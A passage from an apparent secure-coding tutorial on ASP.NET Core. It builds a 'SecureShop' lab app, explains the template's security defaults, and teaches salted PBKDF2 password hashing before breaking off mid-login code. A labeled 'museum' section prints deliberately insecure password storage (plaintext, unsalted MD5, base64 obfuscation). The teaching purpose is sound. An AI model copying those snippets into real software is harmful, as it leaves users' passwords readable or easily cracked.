1. **Assume nothing, verify everything.** The endpoint *says* only admins use it; you check whether the *code* enforces it.
2. **Think in data flow.** Where does input enter? Where is it stored? Where is it output? Injection lives at each crossing of a trust boundary.
3. **The user is not the attacker — the user's browser is not the user either.** The client can be scripted by an enemy (Chapter 14 runs on this).
4. **What the developer intended is irrelevant; what the code permits is everything.** Intentions do not run on servers.
5. **Write it down.** A finding you cannot articulate with severity, evidence, and fix is not a finding; it is a rumor (Chapters 21-22 make you write real ones).

### 3.8 Recap

- Vocabulary: asset, threat actor, threat, vulnerability, exploit, risk (likelihood × impact), control, defense in depth, attack surface, trust boundary.
- CIA triad: confidentiality, integrity, availability — every control protects one of them.
- AuthN = who you are; AuthZ = what you may do; both are mandatory and separate.
- OWASP's Top 10 (2021) is the map of the terrain — and this guide defeats all ten on real code.
- History repeats: weak credentials, string-built SQL, unvalidated redirects, deserialization, forgotten dependencies — the same wound, reopened every year.

**Next:** enough theory. Chapter 4 installs your tools, creates the SecureShop solution (MVC + API), and explains every single line of the generated code — and you will start inspecting it with the HTTP eyes you just grew.
## Chapter 4: Building the Lab and the SecureShop Project

> "Theory is cheap. Let's type."

### 4.1 What You Will Learn in This Chapter

You will install nothing but the essentials, create the **SecureShop** solution — one MVC storefront (`SecureShop.Web`) plus one Web API (`SecureShop.Api`) — and then slow down and read **every generated line** like an analyst would: `Program.cs`, the `.csproj`, `launchSettings.json`, a controller, and a Razor view. Understanding the default template matters because the template *is* your security baseline: it arrives with some protections already configured (HTTPS redirection, HSTS, error-page isolation) and — more importantly — with holes we will deliberately discover and fix in later chapters.

### 4.2 Install and Verify the Tools

1. **.NET 8 SDK** — from <https://dotnet.microsoft.com/download/dotnet/8.0>. Verify:

```bash
dotnet --version
# expected output: 8.0.xxx  (any 8.0.nnn means you are ready)
```

The `dotnet` command *(word-by-word: the .NET tool — "dot net" was the marketing-era name for the platform, and the command kept it)* is your everything: project creation, building, running, adding libraries, migrations later.

2. **Editor** — Visual Studio Code + the "C# Dev Kit" extension (or full Visual Studio 2022 / Rider — identical results).
3. **Browser + devtools** (Chapter 2) and **curl** — you already have both.
4. **OWASP ZAP** — download from <https://www.zaproxy.org> now; we fire it up in Chapter 22.

### 4.3 Create the Solution

Open a terminal in a fresh folder and type these — each line is explained below the block:

```bash
mkdir SecureShop && cd SecureShop
dotnet new sln -n SecureShop
dotnet new mvc -n SecureShop.Web -o src/SecureShop.Web
dotnet new webapi --use-controllers -n SecureShop.Api -o src/SecureShop.Api
dotnet sln add src/SecureShop.Web src/SecureShop.Api
```

- `mkdir SecureShop && cd SecureShop` — create and enter the root folder. `&&` chains two commands: run the second only if the first succeeds.
- `dotnet new sln -n SecureShop` — a **solution** *(file: `SecureShop.sln`)* is a container that groups related projects so they open, build, and evolve together. `-n` sets the **n**ame.
- `dotnet new mvc -n SecureShop.Web -o src/SecureShop.Web` — create an MVC app. `-n` names the project; `-o` (**o**utput) sets the folder. The `src/` subfolder keeps code separated from future `tests/`.
- `dotnet new webapi --use-controllers -n SecureShop.Api -o src/SecureShop.Api` — create a Web API. Why `--use-controllers`? .NET 8's default API template is "**minimal APIs**" (endpoints declared inline in `Program.cs`); we choose **controller-based** APIs because they let us teach `[Authorize]`, routing, and model binding in the structured way most enterprise code you will ever review is written.
- `dotnet sln add ...` — registers both projects inside `SecureShop.sln`.

### 4.4 Read the `.csproj`, Word by Word

Open `src/SecureShop.Web/SecureShop.Web.csproj`:

```xml
<Project Sdk="Microsoft.NET.Sdk.Web">

  <PropertyGroup>
    <TargetFramework>net8.0</TargetFramework>
    <Nullable>enable</Nullable>
    <ImplicitUsings>enable</ImplicitUsings>
  </PropertyGroup>

</Project>
```

- `<Project Sdk="Microsoft.NET.Sdk.Web">` — selects the build recipe for a *web* project (brings in ASP.NET Core automatically). The **Sdk attribute** decides what kind of software this is; class libraries use `Microsoft.NET.Sdk` instead (Chapter 5).
- `<TargetFramework>net8.0</TargetFramework>` — the platform version we compile against. Locked to an LTS on purpose.
- `<Nullable>enable</Nullable>` — the compiler now *warns* when a reference might hold `null` and you use it carelessly. Security value: a whole family of crashes — and crash-inducing DoS primitives (Chapter 19) — comes from unhandled `null`s; nullable analysis catches them at compile time, before attackers do.
- `<ImplicitUsings>enable</ImplicitUsings>` — common `using` directives (e.g. `System`, `System.Collections.Generic`) are added invisibly, so sample code stays short. That is why our later files "mysteriously" compile without listing every `using`.

The API project is identical plus one block:

```xml
  <ItemGroup>
    <PackageReference Include="Swashbuckle.AspNetCore" Version="6.4.0" />
  </ItemGroup>
```

- **NuGet** *(the package manager of .NET — nuget.org hosts ~350k libraries)* — a `PackageReference` is a dependency: code someone else wrote, compiled into your app. [DANGER] Every dependency is attack surface (OWASP A06 — that is how Equifax fell). Chapter 22 shows the one command that audits them all; for now, note that the **version number** is pinned explicitly — that discipline ("no floating versions") is itself a control.

### 4.5 `launchSettings.json`, Line by Line

Open `src/SecureShop.Web/Properties/launchSettings.json` — *developer-only* instructions for how `dotnet run` should start the app (this file never ships to production):

```json
{
  "$schema": "http://json.schemastore.org/launchsettings.json",
  "profiles": {
    "https": {
      "commandName": "Project",
      "dotnetRunMessages": true,
      "launchBrowser": true,
      "applicationUrl": "https://localhost:7101;http://localhost:5101",
      "environmentVariables": {
        "ASPNETCORE_ENVIRONMENT": "Development"
      }
    }
  }
}
```

- `"$schema"` — points validators to a JSON Schema so editors can autocomplete; pure convenience.
- `"profiles"` — named ways to start. One profile = one start configuration.
- `"applicationUrl": "https://localhost:7101;http://localhost:5101"` — the URLs Kestrel *(the built-in web server that hosts your app)* will listen on. **Change the random template ports to these fixed ones** so that every command in the next 18 chapters works verbatim. Do the same in the API project: `https://localhost:7102;http://localhost:5102`.
- `"ASPNETCORE_ENVIRONMENT": "Development"` — selects the **environment**. `Development` vs `Production` changes behavior we care about enormously: verbose error pages and detailed exceptions are shown *only* in Development (Chapter 19), and `app.Environment.IsDevelopment()` branches appear in your `Program.cs` right now.
- `https://...` — when you first run, .NET creates a **self-signed developer certificate** and trusts it locally; the browser then shows a padlock for `localhost`. That is your personal TLS lab for Chapter 17.

> [ANALYST LENS] When reviewing a deployed .NET app, one of the first checks is: *"Can I make the server believe it is in Development?"* — `ASPNETCORE_ENVIRONMENT=Development` mis-set in production is a classic A05 misconfiguration: it hands attackers stack traces.

### 4.6 The MVC `Program.cs`, Line by Line

The entire startup of your web app is this file — the security-relevant parts are flagged now and taught in their chapters:

```csharp
var builder = WebApplication.CreateBuilder(args);      // 1
builder.Services.AddControllersWithViews();            // 2

var app = builder.Build();                            // 3

if (!app.Environment.IsDevelopment())                  // 4
{
    app.UseExceptionHandler("/Home/Error");          // 4a
    app.UseHsts();                                    // 4b
}

app.UseHttpsRedirection();                            // 5
app.UseStaticFiles();                                 // 6
app.UseRouting();                                     // 7
app.UseAuthorization();                               // 8

app.MapControllerRoute(                               // 9
    name: "default",
    pattern: "{controller=Home}/{action=Index}/{id?}");

app.Run();                                            // 10
```

1. `WebApplication.CreateBuilder(args)` — creates the app builder: the object that collects *settings* (services) first, then constructs the app. `args` passes command-line arguments into configuration.
2. `builder.Services.AddControllersWithViews();` — **dependency injection** (DI) registration: tells .NET "MVC controllers and Razor views are available to this app". **Services** *(word-by-word: capabilities the framework provides to your code on demand)* are everything from "render Razor" to, later, "validate JWTs" — every chapter adds a line here, and every such line is a *control decision*.
3. `builder.Build()` — freeze the configuration into an actual app.
4. `if (!app.Environment.IsDevelopment())` — *only in production*: (a) route unhandled exceptions to a friendly `/Home/Error` page instead of leaking stack traces; (b) `UseHsts()` — send `Strict-Transport-Security`, telling browsers "only ever talk to me over HTTPS" (Chapter 17). Note what this implies: **the template already treats information leakage as a threat.** Good instinct; we go further in Chapter 19.
5. `UseHttpsRedirection()` — HTTP requests get `301`-redirected to HTTPS.
6. `UseStaticFiles()` — serve files from `wwwroot/` (CSS/JS/images). [ANALYST LENS] static file serving is where "accidentally deployed backups and config files" become world-readable — audit what sits in that folder.
7. `UseRouting()` — match incoming URLs to endpoints (the machinery behind `{controller}/{action}`).
8. `UseAuthorization()` — insert the **authorization middleware**: the gate that will enforce `[Authorize]` attributes from Chapter 7 onward. Notice what is *not* here yet: `UseAuthentication()` — no user identities exist until we add them (Chapter 6). The template honestly ships *without* auth: if you deploy it as-is, it is an open app.
9. `MapControllerRoute(...)` — the default route pattern `{controller=Home}/{action=Index}/{id?}`: URL `/products/details/3` targets `ProductsController.Details(3)`; with no segments, `HomeController.Index()`. `id?` means optional. Chapter 11 exploits *predictable* routes; Chapter 18 explains middleware ordering in depth.
10. `app.Run()` — start listening. Every `Use...` above is queued **middleware**: each request flows down this pipeline, gets answered, and flows back (the full diagram is Chapter 18's centerpiece).

### 4.7 The API `Program.cs`

`src/SecureShop.Api/Program.cs` — same skeleton, API flavor:

```csharp
var builder = WebApplication.CreateBuilder(args);

builder.Services.AddControllers();                    // controllers, no views
builder.Services.AddEndpointsApiExplorer();           // metadata for tooling
builder.Services.AddSwaggerGen();                     // OpenAPI explorer

var app = builder.Build();

if (app.Environment.IsDevelopment())
{
    app.UseSwagger();
    app.UseSwaggerUI();                               // /swagger page, DEV ONLY
}

app.UseHttpsRedirection();
app.MapControllers();
app.Run();
```

- `AddEndpointsApiExplorer()` + `AddSwaggerGen()` — enable **OpenAPI/Swagger**: a machine-readable description of your endpoints (`/swagger/v1.json`) and a human page (`/swagger`) listing every route, parameter, and response type. **Under guard it is a gift to defenders; exposed in production it is a detailed map for attackers** — every endpoint enumerated for free ([DANGER]: a Swagger page in production is an instant real-world finding). That is why the template wraps it in the `IsDevelopment()` check.
- No `UseStaticFiles`, no views — APIs emit data, not pages.

### 4.8 First Feature: The Product Catalog (Both Apps)

**The shared data shape.** For now each project defines its own `Product` (Chapter 5 extracts a shared library — a small lesson in code organization). In `SecureShop.Web`, create `Models/Product.cs`:

```csharp
namespace SecureShop.Web.Models;                      // 1

public class Product                                  // 2
{
    public int Id { get; set; }                      // 3
    public string Name { get; set; } = string.Empty; // 4
    public string Description { get; set; } = string.Empty;
    public decimal Price { get; set; }               // 5
    public string Sku { get; set; } = string.Empty;  // 6
}
```

1. `namespace` — the full "address" of this type; other files reach it via `using SecureShop.Web.Models;`. Namespaces prevent name collisions and, later, are how we organize security code (`SecureShop.Core.Security` in Chapter 5).
2. `public class Product` — a **class** (a data shape + behavior blueprint); `public` = visible from other files/projects.
3. `public int Id { get; set; }` — an **auto-property**: a field with a built-in getter/setter. `int` = 32-bit integer. `Id` will be the primary identifier — and its predictability is attacked in Chapter 11.
4. `public string Name { get; set; } = string.Empty;` — a string property *initialized to empty* instead of `null`: with `Nullable` enabled, this declaration promises "Name is never null" — the compiler enforces discipline. `string.Empty` *(word-by-word: an empty string — present but zero characters, as opposed to `null`, meaning "no string at all")*.
5. `decimal Price` — **money must be `decimal`, never `double`**: `double` is binary floating point and cannot represent `0.10` exactly (it stores `0.0999999...`), so cents silently drift. A price that "drifts" is an integrity failure — and rounding tricks become attack tools. `decimal` is base-10 and exact.
6. `Sku` — stock keeping unit, the merchant's code.

**MVC side.** In `Controllers/HomeController.cs`, replace the body of `Index()`:

```csharp
public IActionResult Index()
{
    var products = new List<Product>
    {
        new() { Id = 1, Name = "Ethiopia Yirgacheffe", Description = "Floral, tea-like, single origin", Price = 18.50m, Sku = "COF-ETH-001" },
        new() { Id = 2, Name = "Colombia Huila", Description = "Caramel, red apple, medium roast", Price = 16.00m, Sku = "COF-COL-002" },
        new() { Id = 3, Name = "Kenya AA", Description = "Blackcurrant, bright acidity", Price = 21.00m, Sku = "COF-KEN-003" }
    };
    return View(products);
}
```

- `IActionResult` — an "answer the framework understands": a view, a redirect, JSON, `404` — return types unify in one contract. Deciding *which* to return (view vs `NotFound()`) is controller logic.
- `new() { ... }` — C# **target-typed new**: the compiler infers the type from context. `18.50m` — the `m` marks a `decimal` literal.
- `return View(products)` — "render my matching view, and hand it `products`". "Matching" = by convention `Views/Home/Index.cshtml` — *conventions are how MVC routes code and templates to each other; attackers also read conventions* (Chapter 11: predictable patterns in URLs and files).

Create `Views/Home/Index.cshtml` (replace its content):

```html
@model IEnumerable<SecureShop.Web.Models.Product>          <!-- 1 -->

<table class="table">
    <thead><tr><th>Product</th><th>Price</th></tr></thead>
    <tbody>
    @foreach (var product in Model)                        <!-- 2 -->
    {
        <tr>
            <td>@product.Name</td>                          <!-- 3 -->
            <td>@product.Price.ToString("C")</td>
        </tr>
    }
    </tbody>
</table>
```

1. `@model` — declares the view's input type: an `IEnumerable<Product>` (a sequence of products). Razor (the "C# + HTML" template engine) will strongly type-check every access to `Model`.
2. `@foreach` — C# embedded in HTML. Note the *symbol* `@` is Razor's single escape character: everything it touches becomes C# again.
3. `@product.Name` — outputs the name **HTML-encoded automatically**. Highlight this sentence: *Razor encodes by default* — the single most important fact in Chapter 13 (XSS), and one of the reasons Razor apps resist XSS far better than most stacks. We break that protection once, on purpose, to watch it bleed — then never again.

**API side.** In `SecureShop.Api`, create the same `Models/Product.cs` (namespace `SecureShop.Api.Models`), then `Controllers/ProductsController.cs`:

```csharp
using Microsoft.AspNetCore.Mvc;                     // 1
using SecureShop.Api.Models;

namespace SecureShop.Api.Controllers;

[ApiController]                                      // 2
[Route("api/[controller]")]                         // 3
public class ProductsController : ControllerBase   // 4
{
    private static readonly List<Product> _products = new()   // 5
    {
        new() { Id = 1, Name = "Ethiopia Yirgacheffe", Description = "Floral, tea-like", Price = 18.50m, Sku = "COF-ETH-001" },
        new() { Id = 2, Name = "Colombia Huila", Description = "Caramel, red apple", Price = 16.00m, Sku = "COF-COL-002" },
        new() { Id = 3, Name = "Kenya AA", Description = "Blackcurrant, bright", Price = 21.00m, Sku = "COF-KEN-003" }
    };

    [HttpGet]                                        // 6
    public ActionResult<IEnumerable<Product>> GetAll()
        => Ok(_products);                             // 7

    [HttpGet("{id:int}")]                            // 8
    public ActionResult<Product> GetById(int id)
    {
        var product = _products.FirstOrDefault(p => p.Id == id);   // 9
        return product is null ? NotFound() : Ok(product);        // 10
    }
}
```

1. `using Microsoft.AspNetCore.Mvc;` — imports MVC attributes and base classes.
2. `[ApiController]` — switches on API behaviors: automatic 400 responses when model binding fails, automatic binding of route/bodies to parameters, and attribute-required routing. This attribute is a quiet security feature: malformed input gets rejected *structurally* before your code runs.
3. `[Route("api/[controller]")]` — base route; the token `[controller]` expands to `products` (controller class name minus the "Controller" suffix), so endpoints live under `/api/products`.
4. `ControllerBase` — like `Controller` (Chapter 1's MVC version) but trimmed for APIs (no view support).
5. `private static readonly List<Product> _products` — our fake in-memory database. `static` = one shared list for the whole app; `readonly` = the *reference* cannot be swapped (contents can — that becomes a lesson in Chapter 13). [NOTE] This placeholder vanishes in Chapter 6 when a real database arrives.
6. `[HttpGet]` — method selector: "answer HTTP GET at the class's base route" → `GET /api/products` → this method.
7. `=> Ok(_products)` — `Ok(...)` wraps data in `200 OK` with JSON serialization. In .NET 8 this is asynchronous under the hood without us writing `await`.
8. `[HttpGet("{id:int}")]` — route *with a parameter*: `GET /api/products/3` puts `3` into the `id` argument. The `:int` **route constraint** rejects non-integer input before your code runs (`/api/products/abc` → `404`, not an exception) — the first input-validation control you have deliberately applied. Note: constraints *narrow types* but say nothing about *permission*.
9. `FirstOrDefault(p => p.Id == id)` — LINQ *(Language Integrated Query — C#'s query syntax for collections, and later for databases)*: scan the list, return the first match or `null`. The lambda `p => p.Id == id` is an inline mini-function: "given product p, test if its Id equals ours."
10. `product is null ? NotFound() : Ok(product)` — ternary conditional. `is null` — modern null test. `NotFound()` — a `404` result: correct REST semantics — "no such resource" (Chapter 2's `404` discussion becomes live code).

### 4.9 Run Everything

Two terminals:

```bash
dotnet run --project src/SecureShop.Web      # MVC at https://localhost:7101
```

```bash
dotnet run --project src/SecureShop.Api      # API at https://localhost:7102
```

`[LAB]` Do each of these and record what you see:

1. Browse `https://localhost:7101` — the product table renders.
2. Browse `https://localhost:7102/swagger` — the API's map; notice every endpoint we just wrote is already listed for you, free.
3. `curl -v https://localhost:7102/api/products` — inspect response headers (find `Content-Type: application/json`).
4. `curl -v https://localhost:7102/api/products/3` then `.../999` — verify `200` vs `404` yourself.
5. DevTools (F12 → Network) on the MVC page: find the HTML request, read its headers, and locate the static CSS/JS requests served by `UseStaticFiles()`.
6. DevTools → Application → Cookies: notice there are **no cookies yet**. That emptiness ends in Chapter 6.

### 4.10 The Security Lens on Our Newborn App

What exists already, thanks to the template: HTTPS + developer TLS, conditional HSTS, prod-only error routing, `Nullable` warnings, API auto-validation, route constraints. What is missing — the honest audit view:

- **No authentication** — anybody is "everyone".
- **No authorization** — and no roles exist to authorize with.
- **No database** — so no injection yet; that also means no *real* persistence story for users, carts, orders.
- **No cookies, no sessions, no CSRF surface** — that surface is born in Chapter 7 and defended in Chapter 14.
- **No security headers** (CSP etc.), **no rate limiting**, **no logging** — Chapters 18-19.

We add each when it becomes real — that is exactly how a real codebase matures, and exactly how you will audit real codebases: *by walking the maturity of each control.*

### 4.11 Recap

- Solution = `SecureShop.sln`; projects: `SecureShop.Web` (MVC, port 7101) and `SecureShop.Api` (API, port 7102); environments decide debug vs hardened behavior.
- `Program.cs` is a pipeline of middleware; template defaults (HSTS, HTTPS redirect, prod error page, dev-only Swagger) are your first controls — verify them in every app you review.
- MVC renders encoded Razor views; APIs return JSON from `[ApiController]` classes; route constraints and model binding are structural input validation.
- `decimal` for money; `Nullable` discipline; pinned package versions; `IsDevelopment()` guards are audit-check items, not trivia.
- SecureShop is alive — deliberately naive, fully yours, and about to learn identity the hard way.

**Next (Part II):** Chapter 5 starts identity at the true beginning — why "storing passwords" is a phrase that should make you flinch, what hashing really is, and the exact code that stores credentials like it's 2025, not 2005.
# Part II: Authentication

> Authentication answers one question — **"Who are you?"** — and it must answer it with *evidence*, never with assumptions. This part takes SecureShop from "everybody is everybody" to real, evidence-based identity: passwords done right (Ch. 5), ASP.NET Core Identity (Ch. 6), the cookie that carries identity in MVC (Ch. 7), the token that carries it in APIs (Ch. 8), and the industry standard for delegating identity altogether (Ch. 9).

## Chapter 5: Passwords and Hashing

> "A password database should be a pile of unusable garbage — that's the goal."

### 5.1 What You Will Learn in This Chapter

You will learn what actually happens between "user types password" and "user is logged in" — the most security-critical 50 milliseconds in any application. We cover the full history of password storage (each stage of which still exists in the wild, rotting), the cryptography words (**hash**, **salt**, **work factor**) explained word by word, and then you will build the password core of SecureShop with your own hands: a shared class library, a PBKDF2 hasher, and working register/login endpoints — every line explained. You will also learn why this chapter's custom hasher is for *understanding*, and what the platform's own `PasswordHasher` (Chapter 6) adds.

### 5.2 History: How Password Storage Grew Up (and How Often It Didn't)

Passwords were born in 1961 at MIT's Compatible Time-Sharing System (Fernando Corbató), and were first stored as **plaintext** — readable by anyone with file access. The timeline of shame and repair:

- **1974 — `crypt(3)`, Unix.** Ken Thompson moved password storage to a "one-way function" of the password — the OS could verify, but a stolen file could not reveal passwords. Idea correct; hardware of the era made it strong.
- **1990s — fast hashes everywhere.** MD5 (1991) and SHA-1 (1995) were designed to be *fast* — perfect for integrity checks, catastrophic for passwords: speed helps the *attacker* test billions of guesses per second.
- **1999 — bcrypt.** Provos & Mazières published a deliberately *slow*, salted, adaptable password hash. The world took a decade to notice.
- **2003 — rainbow tables.** Philippe Oechslin showed precomputed tables of hash→password mappings cracking unsalted hashes in seconds. Every unsalted hash became a liability overnight.
- **2009 / 2015 — scrypt, then Argon2.** Memory-hard functions raised attacker costs further (GPUs and ASICs hate needing lots of RAM). Argon2 won the Password Hashing Competition.
- **Today's rulebook — NIST SP 800-63B:** salt every password with a unique random salt; use a deliberately slow KDF (PBKDF2 ≥ 600k iterations with SHA-256 as of 2024 guidance, bcrypt cost ≥ 10, or Argon2id); never store plaintext or reversible encryption; never invent your own scheme.

**The lesson that writes this chapter:** when a password database leaks (and history says: assume it will), the *hash function* is the only thing standing between "a pile of unusable garbage" and "ten million cracked passwords". Your job is to choose the garbage pile.

### 5.3 The Concepts, Word by Word

- **Hash (cryptographic hash function)** *(word-by-word: from French "hacher", to chop — a function that chops data into a fixed-size fingerprint)* — an algorithm mapping input of *any* size to a fixed-size output (`SHA-256` → 256 bits) with three properties: **one-way** (from output you cannot recover input), **deterministic** (same input → same output), and **avalanche** (flip one input bit → half the output bits flip). For passwords you want a hash that is also **slow** — the word for that is a **KDF, Key Derivation Function** *(a hash with a built-in cost knob and salt handling, designed for secrets)*.
- **Salt** *(word-by-word: like seasoning — it changes the flavor completely but adds no secret)* — a random, non-secret, *unique-per-password* value mixed into hashing. What it kills: (1) rainbow tables — no point precomputing a table for a salt you have never seen; (2) identical-password detection — two users with password `P@ssw0rd` get completely different hashes, so the attacker learns nothing by comparing rows; (3) the salt is stored *in the open*, next to the hash — that is by design, not a bug.
- **Work factor (iteration count / cost)** — how many times the inner hash runs per password (PBKDF2) or how much memory/time is required (Argon2). One knob, two effects: your server pays ~0.1s once per login; an attacker pays the same ~0.1s *per guess per password*. 100,000 iterations turns a "1 billion guesses/second" GPU rig into a few thousand per second. Slow is the feature.
- **Pepper** — an optional *secret* value mixed in on top of the salt, stored *outside* the database (environment variable / Key Vault). Rationale: if only the DB leaks, hashes stay uncrackable. We wire one properly in Chapter 17's secret management.
- **Why not just encrypt passwords?** Encryption is *reversible by design* — with the key, you get every password back. There is never a legitimate reason for your server to read a user's password (people reuse passwords; your system must not be the leak). Hence: hash, never encrypt, never store plaintext.

> [DANGER] The 2021-updated OWASP A02 "Cryptographic Failures" exists mostly because of this one decision. In code review, the very first thing to grep for in a user table or entity is a `Password` column that is not called something-hash and not, in fact, a hash.

### 5.4 Hands-On: The `SecureShop.Core` Library

Chapters so far duplicated `Product` in both projects. Time to grow up: extract shared code into a class library — the natural home for security code shared by MVC and API.

```bash
dotnet new classlib -n SecureShop.Core -o src/SecureShop.Core
dotnet sln add src/SecureShop.Core
dotnet add src/SecureShop.Web reference src/SecureShop.Core
dotnet add src/SecureShop.Api reference src/SecureShop.Core
```

- `dotnet new classlib` — a **class library**: no web server, no UI — pure code to be referenced. `-n` names it, `-o` places it.
- `dotnet add ... reference ...` — wires a **project reference**: the app can now `using SecureShop.Core.*;` and compile against it. Note for later: project references are *your* code; **package** references are strangers' code (Chapter 22 audits those).

Move the model: create `src/SecureShop.Core/Models/Product.cs` with the `Product` class — change only the namespace line to `namespace SecureShop.Core.Models;` — then **delete** `Models/Product.cs` from both apps and update the two `using` lines (`Home` view: `@model IEnumerable<SecureShop.Core.Models.Product>`; API controller: `using SecureShop.Core.Models;`). This 5-minute refactor previews how a security fix propagates through a codebase: one shared place, many consumers.

### 5.5 The Hasher, Line by Line

Create `src/SecureShop.Core/Security/Pbkdf2PasswordHasher.cs`:

```csharp
using System.Security.Cryptography;                     // 1

namespace SecureShop.Core.Security;

public static class Pbkdf2PasswordHasher                 // 2
{
    private const int SaltSizeBytes = 16;               // 3
    private const int HashSizeBytes = 32;                // 4
    private const int Iterations = 100_000;              // 5

    public static string Hash(string password)           // 6
    {
        byte[] salt = RandomNumberGenerator.GetBytes(SaltSizeBytes);   // 7

        byte[] hash = Rfc2898DeriveBytes.Pbkdf2(         // 8
            password,                                    // 8a
            salt,                                        // 8b
            Iterations,                                  // 8c
            HashAlgorithmName.SHA256,                    // 8d
            HashSizeBytes);                              // 8e

        return $"{Iterations}.{Convert.ToBase64String(salt)}.{Convert.ToBase64String(hash)}";  // 9
    }

    public static bool Verify(string password, string stored)   // 10
    {
        string[] parts = stored.Split('.', 3);           // 11
        if (parts.Length != 3) return false;             // 12

        int iterations = int.Parse(parts[0]);            // 13
        byte[] salt = Convert.FromBase64String(parts[1]);
        byte[] expected = Convert.FromBase64String(parts[2]);

        byte[] actual = Rfc2898DeriveBytes.Pbkdf2(       // 14
            password, salt, iterations,
            HashAlgorithmName.SHA256, HashSizeBytes);

        return CryptographicOperations.FixedTimeEquals(actual, expected);   // 15
    }
}
```

Every line, as promised:

1. `using System.Security.Cryptography;` — .NET's cryptography namespace. Everything below (`RandomNumberGenerator`, `Rfc2898DeriveBytes`, `CryptographicOperations`) lives here. We add **zero external packages**: the standard library is deliberately complete for this job.
2. `public static class` — a *static* class cannot be instantiated; its members are called directly (`Pbkdf2PasswordHasher.Hash(...)`). Right for pure functions with no state.
3. `SaltSizeBytes = 16` — a 128-bit salt: enough that no two users (even twins with identical passwords) ever share it; the standard choice across bcrypt/Argon2/PBKDF2 implementations.
4. `HashSizeBytes = 32` — a 256-bit derived key: matches SHA-256's output — no benefit going smaller.
5. `Iterations = 100_000` — the work factor (the `_` digit separator is just readability). OWASP's floor for PBKDF2-HMAC-SHA256 is in the hundreds of thousands; we start at 100k and raise it in Chapter 17 once we can measure login latency. The number is *stored with the hash* (line 9), so raising it later doesn't invalidate old hashes — old users keep their old cost; new hashes get the new cost. [ANALYST LENS] "Was the iteration count chosen when the server was new, and never raised?" is a real finding.
6. `Hash` — the recipe: fresh salt → slow-mix → return one *serialized string* containing everything verification will need.
7. `RandomNumberGenerator.GetBytes(16)` — cryptographically secure random bytes. [DANGER] Never use `System.Random` for security values: `Random` is predictable (seeded by clock) and an attacker who can guess your "random" salt can rebuild rainbow tables *for your database*. Chapter 17 shows `Random` vs `RandomNumberGenerator` in detail — this is the short version: `Random` = dice, `RandomNumberGenerator` = the universe.
8. `Rfc2898DeriveBytes.Pbkdf2(...)` — PBKDF2 *(Password-Based Key Derivation Function #2, RFC 2898; the current spec is RFC 8018)* — .NET 6+'s clean static call. What it does internally: compute `HMAC-SHA256(password || salt)` and repeat `Iterations` times, mixing each round into the next. Arguments:
   - **8a** `password` — the user's plaintext, in memory only for this call;
   - **8b** `salt` — our fresh 16 random bytes;
   - **8c** `Iterations` — turn the knob 100,000 times;
   - **8d** `HashAlgorithmName.SHA256` — the inner PRF. Deliberately *not* SHA-1 (PBKDF2's historical default — 2024 NIST guidance deprecates it for this use);
   - **8e** `HashSizeBytes` — how many output bytes to produce.
9. The output format `"{iterations}.{salt}.{hash}"` — human example: `100000.Q8xj...9fA=.K3pZ...7wQ=`. Everything needed to re-verify later travels *with the hash*: iteration count (upgradable), salt (required and public), derived key (the secret). **Base64** *(word-by-word: 64-character alphabet of A–Z, a–z, 0–9, +, / — an encoding for stuffing binary bytes into text; NOT encryption, NOT compression — a child can reverse it)*.
10. `Verify` — takes what the user typed and what the database stores; answers *only* true/false. It must never return or reveal the stored hash.
11. `stored.Split('.', 3)` — parse our own format back; the `3` caps splitting into 3 parts max (micro-optimization; base64 contains no `.`).
12. `if (parts.Length != 3) return false;` — malformed stored value ⇒ fail closed *(word-by-word: on any doubt, the door stays shut)*. Never `throw` on a bad record during login — attacker-controllable crash paths become DoS (Chapter 19).
13. Parse out the three pieces — including `iterations` **from the record itself**: verifying an old hash automatically uses the old count. This is what "future-proofing" looks like in one line.
14. Re-derive: same function, same salt, same cost, on the *candidate* password. Determinism (§ 5.3) guarantees: correct password ⇒ byte-identical result.
15. `CryptographicOperations.FixedTimeEquals(actual, expected)` — compares every byte **in constant time** *(takes the same duration whether the first mismatching byte is position 0 or position 31)*. Why: normal `==` short-circuits and leaks *how many leading bytes matched* through response-time differences — a **timing side channel** *(word-by-word: information that leaks out sideways through time instead of through data)* an attacker can measure statistically. `FixedTimeEquals` is the platform's ready-made defense — use it for every secret comparison, including the API keys you will check in later chapters.

### 5.6 [VULNERABLE] The Museum — and Why Each Exhibit Died

Learn the failures by *seeing* them; here is what you must never write:

```csharp
// Exhibit A: plaintext — readable by every DB reader, every backup, every log copy. Career-limiting.
user.Password = password;

// Exhibit B: unsalted fast hash — rainbow-tabled in seconds; identical passwords visibly identical.
user.PasswordHash = Convert.ToHexString(MD5.HashData(Encoding.UTF8.GetBytes(password)));

// Exhibit C: "clever" homemade mix — obfuscation, not cryptography; reversible by anyone who reads your code.
user.PasswordHash = Convert.ToBase64String(Encoding.UTF8.GetBytes(password + "SecureShopSecret"));
```

Exhibit B is worth one experiment: hash `password123` and `letmein123` with plain SHA-256, paste the hex into any hash-lookup site (crackstation.net holds ~15 billion precomputed entries), and watch both fall instantly. Salt and slowness are precisely what makes that lookup impossible — the table would have to be built *per user, per salt*, at 100,000 operations per guess.

### 5.7 Register and Login Endpoints, Line by Line

Add to the API (file `src/SecureShop.Api/Controllers/AuthController.cs`):

```csharp
using System.Collections.Concurrent;                       // 1
using Microsoft.AspNetCore.Mvc;
using SecureShop.Core.Security;

namespace SecureShop.Api.Controllers;

public record RegisterRequest(string Username, string Password);   // 2

public class RegisteredUser(string username, string passwordHash)  // 3
{
    public string Username { get; } = username;
    public string PasswordHash { get; } = passwordHash;
}

[ApiController]
[Route("api/auth")]
public class AuthController : ControllerBase
{
    private static readonly ConcurrentDictionary<string, RegisteredUser> _users = new();   // 4

    [HttpPost("register")]
    public IActionResult Register(RegisterRequest request)         // 5
    {
        if (string.IsNullOrWhiteSpace(request.Username) ||
            request.Username.Length is < 3 or > 32)                 // 6
            return BadRequest(new { error = "Username must be 3-32 characters." });

        if (request.Password is null || request.Password.Length < 12)
            return BadRequest(new { error = "Password must be at least 12 characters." });

        var hash = Pbkdf2PasswordHasher.Hash(request.Password);    // 7

        if (!_users.TryAdd(request.Username.ToLowerInvariant(),     // 8
                           new RegisteredUser(request.Username, hash)))
            return Conflict(new { error = "Username is taken." });

        return StatusCode(StatusCodes.Status201Created);           // 9
    }

    [HttpPost("login")]
    public IActionResult Login(RegisterRequest request)             // 10
    {
        bool known = _users.TryGetValue(request.Username.ToLowerInvariant(),
                                        out RegisteredUser? user);  // 11

        bool ok = Pbkdf2PasswordHasher.Verify(request.Password,
                        known ? user!.PasswordHash : DummyHash());  // 12

        if (!known || !ok)                                          // 13
            return Unauthorized();

        return Ok(new { message = $"Welcome back, {user!.Username}." });   // 14
    }

